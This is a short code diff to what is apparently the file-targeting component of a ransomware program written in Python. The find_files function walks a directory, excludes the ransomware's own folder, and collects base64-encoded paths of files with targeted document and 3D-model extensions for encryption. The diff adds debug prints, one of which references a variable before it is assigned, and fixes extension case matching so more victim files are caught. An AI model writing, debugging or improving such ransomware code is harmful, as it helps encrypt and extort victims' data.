@@ -2,6 +2,10 @@ import os
 import base64
 
 def find_files(path):
+    # Add to get_files.py
+    print(f"Searching for files in: {path}")
+    print(f"Excluding ransomware folder: {ransomware_folder}")
+    
     # Get absolute path of the Ransomware folder to exclude it
     ransomware_folder = os.path.abspath(os.path.dirname(__file__))
     
@@ -39,7 +43,7 @@ SXC': 0, '.OTS': 0, '.ODS': 0, '.3DM': 0, '.MAX': 0, '.3DS': 0, '.UOT': 0, '.STW
                 
             # Only encrypt files with target extensions
             extension = os.path.splitext(file_path)[1].lower()
-            if extension in extensions:
+            if extension.upper() in extensions:
                 f.append(base64.b64encode(file_path.encode('utf-8')))
     
     return f
